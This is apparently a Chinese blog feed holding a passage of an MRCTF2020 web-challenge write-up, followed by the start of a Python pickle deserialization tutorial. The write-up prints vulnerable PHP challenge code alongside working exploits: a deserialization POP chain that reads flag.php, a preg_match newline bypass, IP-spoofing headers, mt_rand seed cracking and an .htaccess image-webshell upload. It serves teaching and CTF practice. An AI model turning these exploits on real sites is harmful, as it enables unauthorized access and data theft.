class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200411114856.png" style="zoom: 67%;"><h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200411143044.png" style="zoom:80%;"><h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>试了好多，发现只能传png格式的文件,<code>.htaccess</code>绕过</p><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200411144913.png" style="zoom:80%;"><p>再上传一个png的图片马即可</p><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200411145316.png" style="zoom:80%;"><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>pop链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show-&gt;__wakeup()-&gt;preg_match()-&gt;__toString()-&gt;Test-&gt;__get-&gt;Modifier-&gt;__invoke-&gt;append()</span><br></pre></td></tr></table></figure><p>分析一下，反序列化首先会执行<code>__wakeup()</code>方法，然后preg_match匹配触发<code>__toString</code>方法，即对象当作字符串匹配时，<code>$str</code>是一个<code>Test</code>对象，获得<code>source</code>属性从而触发<code>__get()</code>方法，<code>$p</code>被赋值为<code>Modifier</code>对象，类当作函数调用触发<code>__invoke</code>方法，接着就是文件包含php://fiter base64读文件了</p><h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php字符串解析特性，preg_match换行绕过，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t=<span class="number">23333</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>提示<code>secrettw.php</code>查看源代码，明显是jsfuck</p><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200412154645.png" style="zoom:80%;"><p>控制台执行，提示</p><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200412154755.png" style="zoom:80%;"><p>POST过去一个参数为Merak，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>把change函数逆向一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    $s = base64_encode($re);</span><br><span class="line">    <span class="keyword">echo</span>  $s;</span><br><span class="line">&#125;</span><br><span class="line">change(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">// ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure><p>伪造一下ip:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Forwarded-Host:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-remote-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-remote-addr:127.0.0.1</span></span><br><span class="line"><span class="attribute">True-Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">X-Real-IP:127.0.0.1</span></span><br></pre></td></tr></table></figure><p>2333那里用data://协议</p><p>最终请求</p><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200412160934.png" style="zoom:80%;"><h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>dirsearch扫不知为啥扫不出来，手怼<code>/www.zip</code>，index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$mt_srand() = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>先看最下面，很明显php伪随机数，给了mt_srand()，用php_mt_seed爆破出种子，再用种子算private_key</p><p>先生成php_mt_seed爆破的序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">print(str(s.index(i))+<span class="string">&quot; &quot;</span>+str(s.index(i))+<span class="string">&quot; 0 61 &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>爆破出种子为1775196155</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> public_key().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> private_key().<span class="string">&quot;\n&quot;</span>;<span class="comment">// XuNhoueCDCGc</span></span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>试了试index.php没反应，源码可能是登陆页面，longin.php还真有</p><p>接着就注入拿flag了</p><img src="/2020/04/11/MRCTF2020-writeup/TIM截图20200416122724.png" style="zoom:80%;"><h3 id="Ezpop-Reveng"><a href="#Ezpop-Reveng" class="headerlink" title="Ezpop_Reveng"></a>Ezpop_Reveng</h3><p>dirsearch又扫不到<code>www.zip</code>，也不知道是啥原因，换dirmap了</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> MRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python反序列化学习</title>
      <link href="2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了Python反序列化的相关内容！</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>与php序列化反序列化类似</p><p>Python序列化，就是把一个在内存当中的python对象通过某种协议或者标准，转换成二进制类型的数据。</p><p>Python反序列化，是一个完全相反的过程，从磁盘文件或者网络中读取到二进制数据，将它们转换成内存中可操作的对象，这就是反序列化。</p><p>Python实现序列化方案：</p><ul><li>pickle</li><li>PyYAML</li><li>XML</li><li>json</li><li>messagepack</li></ul><p>下面主要介绍pickle模块序列化与反序列化</p><h2 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h2><p><strong>序列化：使用dumps或者dump方法</strong></p><ul><li>dumps：将内存对象序列化为字节对象</li><li>dump：将内存对象序列化到文件对象(存入文件)</li></ul><p><strong>反序列化：使用loads和load方法</strong></p><ul><li>loads：将 字节对象反序列化为内存对象</li><li>load：从文件对象反序列化为内存对象</li></ul><p><strong>举个例子：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;MoonBack&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">print(pickle.dumps(a))</span><br><span class="line">print(pickle.loads(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><img src="/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/TIM截图20200409194036.png" style="zoom:80%;"><p><code>__str__</code>类似于java中的toString方法，即返回对象的字符串表示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x03c__main__\nPeople\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\x08\x00\x00\x00MoonBackq\x04sb.&#x27;</span></span><br></pre></td></tr></table></figure><p>这么长的一串是啥意思呢？慢慢来说</p><h2 id="pickle指令码"><a href="#pickle指令码" class="headerlink" 